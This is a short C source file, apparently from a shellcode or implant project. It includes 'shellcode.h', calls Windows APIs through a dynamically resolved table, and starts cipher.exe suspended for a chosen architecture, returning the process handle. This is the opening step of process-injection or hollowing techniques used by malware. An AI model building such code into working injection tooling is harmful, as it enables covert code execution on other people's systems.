#include "shellcode.h"
#include "libc.h"

extern API Api;

HANDLE FindProcessByArch(const wchar_t* arch)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    memset_(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset_(&pi, 0, sizeof(pi));

    LPWSTR path32 = L"C:\\Windows\\SysWOW64\\cipher.exe";
    LPWSTR path64 = L"C:\\Windows\\System32\\cipher.exe";
    LPWSTR path = 0;

    if (wcscmp_(arch, L"x86") == 0)
        path = path32;
    else
        path = path64;

	BOOL status = Api.CreateProcessW(
		NULL,     // Application name
		path,     // Command line
		NULL,     // Process security attributes
		NULL,     // Primary thread security attributes
		FALSE,       // Handles are not inherited
		CREATE_SUSPENDED, // Creation flags
		NULL,     // Use parent's environment block
		NULL,        // Starting directory 
		&si,         // Pointer to STARTUPINFOW structure
		&pi          // Pointer to PROCESS_INFORMATION structure
	);

    return pi.hProcess;
}